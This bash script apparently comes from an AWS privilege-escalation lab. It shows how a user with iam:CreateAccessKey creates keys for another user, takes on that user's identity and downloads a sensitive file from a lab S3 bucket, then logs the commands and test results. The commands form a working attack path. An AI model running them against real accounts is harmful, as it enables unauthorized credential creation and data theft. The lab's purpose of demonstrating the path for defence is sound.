#!/bin/bash

# Demo script for iam:CreateAccessKey to S3 bucket access
# This script demonstrates how a user with CreateAccessKey permission can create keys for a user with S3 access


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    echo -e "${DIM}\$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    echo -e "\n${CYAN}\$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration
PRIVESC_USER="pl-prod-iam-002-to-bucket-privesc-user"
BUCKET_ACCESS_USER="pl-prod-iam-002-to-bucket-access-user"

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}IAM CreateAccessKey to S3 Bucket Access Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${YELLOW}Note: This scenario requires Terraform outputs for the privesc user credentials${NC}"
echo -e "${YELLOW}Make sure you have deployed this scenario with Terraform first${NC}\n"

# Step 1: Get credentials from Terraform outputs
echo -e "${YELLOW}Step 1: Retrieving privesc user credentials from Terraform${NC}"
cd ../../../../../..  # Go to project root

# Get the module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.single_account_privesc_one_hop_to_bucket_iam_002_iam_createaccesskey.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

# Extract credentials
PRIVESC_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_access_key_id')
PRIVESC_SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_secret_access_key')

if [ "$PRIVESC_ACCESS_KEY" == "null" ] || [ -z "$PRIVESC_ACCESS_KEY" ]; then
    echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
    exit 1
fi

echo "Privesc user: $PRIVESC_USER"
echo "Access Key ID: ${PRIVESC_ACCESS_KEY:0:10}..."
echo -e "${GREEN}✓ Retrieved credentials${NC}\n"

cd - > /dev/null  # Return to scenario directory

# Step 2: Configure AWS credentials for privesc user
echo -e "${YELLOW}Step 2: Configuring AWS credentials for privesc user${NC}"
export AWS_ACCESS_KEY_ID=$PRIVESC_ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$PRIVESC_SECRET_KEY
unset AWS_SESSION_TOKEN

# Verify identity
show_cmd aws sts get-caller-identity --query 'Arn' --output text
CURRENT_USER=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "Current identity: $CURRENT_USER"

if [[ ! $CURRENT_USER == *"$PRIVESC_USER"* ]]; then
    echo -e "${RED}Error: Not authenticated as $PRIVESC_USER${NC}"
    exit 1
fi
echo -e "${GREEN}✓ Verified identity as privesc user${NC}\n"

# Step 3: Get account ID
echo -e "${YELLOW}Step 3: Getting account ID${NC}"
show_cmd aws sts get-caller-identity --query 'Account' --output text
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Account ID: $ACCOUNT_ID"
echo -e "${GREEN}✓ Retrieved account ID${NC}\n"

# Step 4: Check current permissions (should not have S3 access)
echo -e "${YELLOW}Step 4: Testing current permissions${NC}"
echo "Attempting to list S3 buckets..."
show_cmd aws s3 ls
if aws s3 ls 2>&1 | grep -q "AccessDenied\|operation: Access Denied"; then
    echo -e "${GREEN}✓ Confirmed: Cannot list S3 buckets with privesc user${NC}"
else
    echo -e "${YELLOW}Warning: May already have S3 permissions${NC}"
fi
echo ""

# Step 5: Create access keys for the bucket access user
echo -e "${YELLOW}Step 5: Creating access keys for $BUCKET_ACCESS_USER${NC}"
echo "This is the privilege escalation vector..."

show_attack_cmd aws iam create-access-key --user-name $BUCKET_ACCESS_USER --output json
NEW_ACCESS_KEY=$(aws iam create-access-key \
    --user-name $BUCKET_ACCESS_USER \
    --output json)

NEW_ACCESS_KEY_ID=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.AccessKeyId')
NEW_SECRET_ACCESS_KEY=$(echo $NEW_ACCESS_KEY | jq -r '.AccessKey.SecretAccessKey')

echo "Created new access key: $NEW_ACCESS_KEY_ID"
echo -e "${GREEN}✓ Successfully created access keys for bucket access user${NC}\n"

# Wait for keys to propagate
echo -e "${YELLOW}Waiting 15 seconds for access keys to initialize...${NC}"
sleep 15
echo ""

# Step 6: Switch to new bucket access user credentials
echo -e "${YELLOW}Step 6: Switching to bucket access user credentials${NC}"
export AWS_ACCESS_KEY_ID=$NEW_ACCESS_KEY_ID
export AWS_SECRET_ACCESS_KEY=$NEW_SECRET_ACCESS_KEY

show_cmd aws sts get-caller-identity --query 'Arn' --output text
BUCKET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
echo "New identity: $BUCKET_USER_IDENTITY"
echo -e "${GREEN}✓ Switched to bucket access user credentials${NC}\n"

# Step 7: Discover target bucket
echo -e "${YELLOW}Step 7: Discovering target bucket${NC}"
show_cmd aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" --output text
BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" --output text)
echo "Target bucket: $BUCKET_NAME"
echo -e "${GREEN}✓ Found target bucket${NC}\n"

# Step 8: List bucket contents
echo -e "${YELLOW}Step 8: Listing bucket contents${NC}"
echo "Contents of $BUCKET_NAME:"
show_attack_cmd aws s3 ls s3://$BUCKET_NAME/
aws s3 ls s3://$BUCKET_NAME/
echo -e "${GREEN}✓ Successfully listed bucket contents${NC}\n"

# Step 9: Download sensitive data
echo -e "${YELLOW}Step 9: Downloading sensitive data${NC}"
DOWNLOAD_FILE="/tmp/createaccesskey-bucket-sensitive-data-${ACCOUNT_ID}.txt"
show_attack_cmd aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE
aws s3 cp s3://$BUCKET_NAME/sensitive-data.txt $DOWNLOAD_FILE

echo -e "\n${GREEN}✓ Successfully downloaded sensitive file${NC}"
echo -e "${YELLOW}Contents of sensitive file:${NC}"
cat $DOWNLOAD_FILE
echo ""

# Summary
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Attack Summary${NC}"
echo -e "${GREEN}========================================${NC}"
echo -e "Starting Point: User ${YELLOW}$PRIVESC_USER${NC}"
echo -e "Step 1: Created access keys for ${YELLOW}$BUCKET_ACCESS_USER${NC}"
echo -e "Step 2: Switched to new credentials"
echo -e "Step 3: Gained access to ${YELLOW}$BUCKET_NAME${NC}"
echo ""
echo -e "${YELLOW}Attack Path:${NC}"
echo -e "  $PRIVESC_USER → (CreateAccessKey) → $BUCKET_ACCESS_USER → $BUCKET_NAME"
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Attack Commands:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
fi
echo ""

echo -e "${GREEN}Downloaded file location: $DOWNLOAD_FILE${NC}"
echo -e "${GREEN}New access key ID: $NEW_ACCESS_KEY_ID${NC}"
echo ""

# Standardized test results output
echo "TEST_RESULT:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:SUCCESS"
echo "TEST_DETAILS:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:Successfully accessed S3 bucket via CreateAccessKey escalation"
echo "TEST_METRICS:prod_one_hop_to_bucket_iam_002_iam_createaccesskey:access_key_created=true,bucket_accessed=true,data_exfiltrated=true"
echo ""

# Cleanup instructions
echo -e "${RED}IMPORTANT: Run cleanup_attack.sh to delete the created access keys${NC}"
echo -e "${RED}Access Key ID to delete: $NEW_ACCESS_KEY_ID${NC}"
echo ""
echo -e "${YELLOW}To clean up:${NC}"
echo "  ./cleanup_attack.sh"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
